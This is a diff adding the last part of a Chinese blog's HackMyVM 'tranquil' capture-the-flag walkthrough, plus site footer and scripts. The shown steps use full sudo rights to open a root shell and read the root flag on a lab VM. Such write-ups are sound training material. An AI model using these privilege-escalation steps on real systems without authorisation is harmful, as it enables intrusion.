+    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin
+
+User guru may run the following commands on tranquil:
+    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> ALL</code></pre>
+<p>已经拿到完全的sudo权限，所以可以直接切换到root</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">guru@tranquil:~$ <span class="token function">sudo</span> <span class="token function">bash</span>
+root@tranquil:/home/guru<span class="token comment"># id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
+root@tranquil:/home/guru<span class="token comment"># cat ~/r*</span>
+HMVyourfriends</code></pre>
+
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://tao0845.github.io/posts/794033c8/" title="HackMyVM-tranquil">https://tao0845.github.io/posts/794033c8/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/3e9b59e6/" rel="next" title="HackMyVM-Kitty"><span class="post-nav-text">HackMyVM-Kitty</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
